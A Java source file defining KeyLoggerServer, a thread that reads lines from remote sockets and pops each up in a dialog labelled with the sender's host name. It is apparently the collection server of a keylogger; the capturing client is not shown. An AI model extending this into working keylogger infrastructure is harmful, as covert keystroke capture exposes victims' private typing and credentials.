package com.samasend;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import javax.swing.JOptionPane;

/**
 *
 * @author SamAsEnd
 */
public class KeyLoggerServer extends Thread {

    private Socket socket;
    private BufferedReader reader;
    private String source;

    public KeyLoggerServer(Socket socket) throws IOException {
        this.socket = socket;
        source = socket.getInetAddress().getCanonicalHostName();
        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    @Override
    public void run() {
        while (true) {
            try {
                System.out.println("waiting . . . ");
                String readLine = reader.readLine();
                System.out.println("read . . . ");
                JOptionPane.showMessageDialog(null, source + " said: " + readLine);
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
            if (socket == null || socket.isClosed()) {
                break;
            }
        }
    }
}
